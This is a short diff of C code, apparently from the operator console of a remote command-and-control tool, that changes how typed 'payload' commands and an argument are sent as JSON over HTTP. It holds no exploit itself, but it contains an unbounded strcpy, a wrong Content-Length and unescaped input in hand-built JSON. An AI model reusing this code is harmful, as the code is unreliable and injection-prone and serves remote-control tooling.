@@ -180,6 +180,14 @@ char *session_http(int inferno_socket) {
 
         instruction_payload[strcspn(instruction_payload, "\n")] = '\0';
     
+        //copying original payload
+        char command_copy[1024];
+        strcpy(command_copy, instruction_payload);
+
+        //parsing payload
+        char *command = strtok(instruction_payload, " ");
+        char *arg1 = strtok(NULL, " ");
+        
         //exiting session
         if (strcmp(instruction_payload, "exit") == 0) {
             printf("\033[38;5;208m");
@@ -196,8 +204,13 @@ char *session_http(int inferno_socket) {
         sprintf(request + strlen(request), "Content-Type: application/json\r\n");
         sprintf(request + strlen(request), "Content-Length: %d\r\n", strlen(instruction_payload) + 14);
         sprintf(request + strlen(request), "Connection: close\r\n\r\n");
-        sprintf(request + strlen(request), "{'payload':'%s'}", instruction_payload);
-
+   
+        //add arguments to payload if any otherwise send payload
+        if (arg1 == NULL) 
+            sprintf(request + strlen(request), "{'payload':'%s'}", instruction_payload);
+        else
+            sprintf(request + strlen(request), "{'payload':'%s','argument':'%s'}", instruction_payload, arg1);
+        
         //send payload to server
         printf("\033[38;5;208m");
         printf("[>] ");
